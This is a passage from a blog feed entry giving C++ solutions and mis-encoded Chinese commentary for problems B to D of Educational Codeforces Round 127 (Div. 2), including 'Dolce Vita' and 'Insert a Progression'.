class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,a[n]-a[1],n);</span></span><br><span class="line">    <span class="keyword">if</span>(a[n]-a[<span class="number">1</span>]&gt;n+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dolce-Vita"><a href="#C-Dolce-Vita" class="headerlink" title="C. Dolce Vita"></a>C. Dolce Vita</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/3.png" alt="3"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚ç»™ä½ nä¸ªå•†åº—å’Œæ¯å¤© $k$ æšé‡‘å¸ï¼Œæ¯ä¸ªå•†åº—åªæ¯å¤©å–ä¸€ä¸ªç³–æœåŒ…ï¼Œæ¯å¤©æ¶¨ä»·ä¸€å—ã€‚é—®ç»è¿‡å¾ˆå¤šå¤©åä½ æœ€å¤šèƒ½ä¹°åˆ°å¤šå°‘ï¼Œå¹¶ä¸”å®ƒå‘Šè¯‰ä½ äº†æœ€åä¸€å®šæœ‰ä¸€å¤©ä½ ä¸€ä¸ªç³–æœåŒ…ä¹Ÿä¹°ä¸äº†ã€‚</p><p>é¦–å…ˆä¸éš¾å¾—å‡ºï¼Œæˆ‘è‚¯å®šè¦ä»æœ€å°çš„ç³–æœå¼€å§‹ä¹°ä¹°åˆ°ä¸èƒ½ä¹°ä¸ºæ­¢æ‰æ˜¯æœ€ä¼˜çš„è§£ã€‚å› æ­¤å…ˆæ’ä¸ªåºè‚¯å®šæ²¡é”™ï¼Œç„¶åæ±‚å‡ºå‰ç¼€å’Œ $sum[i]$è¡¨ç¤ºä¹° $i$ ä¸ªç³–æœçš„æœ€å°èŠ±è´¹ã€‚è¿™é‡Œå› ä¸ºå¤©æ•°ä¸ç¡®å®šå¾ˆå¯èƒ½è¦è¿‡è¶…è¿‡ $10^9$ å¤©ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ä»å¤©æ•°ä¸Šå¾ªç¯ï¼Œæˆ‘ä»¬å°±æ¨ä»èƒ½ä¹° $i$ ä¸ªç‰©å“åˆ° $i-1$ ä¸ªç‰©å“è¿‡äº†å¤šå°‘å¤©ï¼Œå‡è®¾è¿‡äº† $q$ å¤©ï¼Œé‚£ä¹ˆè¿™å‡ å¤©çš„æ”¶ç›Šå°±æ˜¯ $q*i$ã€‚</p><p>é‚£ä¹ˆå‡è®¾ä»Šå¤©æ˜¯xå¤©ï¼Œæˆ‘èƒ½ä¹°jä»¶ç‰©å“ï¼Œæˆ‘ä»¬èƒ½æŒç»­ä¹°jä»¶ç‰©å“çš„å¤©æ•°å°±æ˜¯ $ceil((double)(x-sum[j])/j-i)+!((x-sum[j])%j)$ã€‚æ¨å‡ºè¡¨è¾¾å¼ä¹‹åå…¶å®æ•´ä¸ªç¨‹åºä¹Ÿå°±ä¸éš¾å†™äº†ï¼Œå…ˆäºŒåˆ†å‡ºç¬¬0å¤©çš„ä½ç½®ç„¶åå¾€å‰ä¸€ä»¶ä¸€ä»¶æ•°å³å¯ï¼Œæœ€åä¸è¦å¿˜äº†å¼€ $long\ long$ï¼Œå¯æ¶ï¼Œæ²¡å‡†æˆ‘å¼€äº†å°±è“åäº†ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    sum[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum[i]=sum[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="built_in">upper_bound</span>(sum,sum+<span class="number">1</span>+n,x)-sum<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;I can choose %d pack\n&quot;,cnt);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=cnt;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;today is %d-th day\n&quot;,i);</span></span><br><span class="line">        <span class="keyword">int</span> after= <span class="built_in">ceil</span>((<span class="keyword">double</span>)(x-sum[j])/j-i)+!((x-sum[j])%j);</span><br><span class="line">        i+=after;</span><br><span class="line">        <span class="comment">//printf(&quot;I can buy until %d\n&quot;,i);</span></span><br><span class="line">        ans+=j*after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åœ¨æ•°åˆ—ä¸­æ’å…¥xä¸ªæ•°ï¼Œä½¿å¾— $\sum <em>{i=1}^{n+x-1}|a_i^{â€˜}-a</em>{i-1}^{â€˜}|$ æœ€å°ã€‚ä¸éš¾å‘ç°å¦‚æœæˆ‘æ’å…¥çš„æ•°åœ¨ä¸¤ä¸ªæ•°ä¹‹é—´ï¼Œé‚£ä¹ˆæ’å…¥è¿™ä¸ªæ•°å¯¹ç»“æœæ²¡æœ‰å½±å“ã€‚è‹¥æ•°åˆ—çš„æœ€å°å€¼å’Œæœ€å¤§å€¼åŒ…æ‹¬çš„éƒ¨åˆ†é‚£äº›æ•°æ’å…¥ä¸­é—´å¯¹ç­”æ¡ˆæ²¡æœ‰å½±å“ï¼Œè‹¥å‰©ä½™å…¶å®ƒæ•°åˆ™æ’åœ¨ä¸¤è¾¹ï¼Œè‡³äºæ’åœ¨å“ªè¾¹å¯ä»¥minä¸€ä¸‹ã€‚</p><p>è¿™é‡Œå½“æ—¶çœ‹é”™é¢˜ç›®äº†ï¼Œä»¥ä¸ºæ¯ä¸ªæ•°ä¹‹é—´åªèƒ½æ’å…¥ä¸€æ¬¡å—ï¼Œå¯¼è‡´åé¢å¡äº†å¾ˆé•¿æ—¶é—´ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><p><img src="/2022/04/23/Educational%20Codeforces%20Round%20127(Div.2)/5.png" alt="5"></p><p>1595åˆ†ï¼ŒåŠ æ²¹ä¸Šè“ï¼ï¼ï¼</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1671&quot;&gt;Educational Codeforces Round 127 (Rated for Div. 2)&lt;/a&gt;ï¼Œå’•äº†æœ‰ç‚¹ä¹…äº†ï¼Œç°åœ¨å¼€å†™é¢˜è§£ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
</feed>
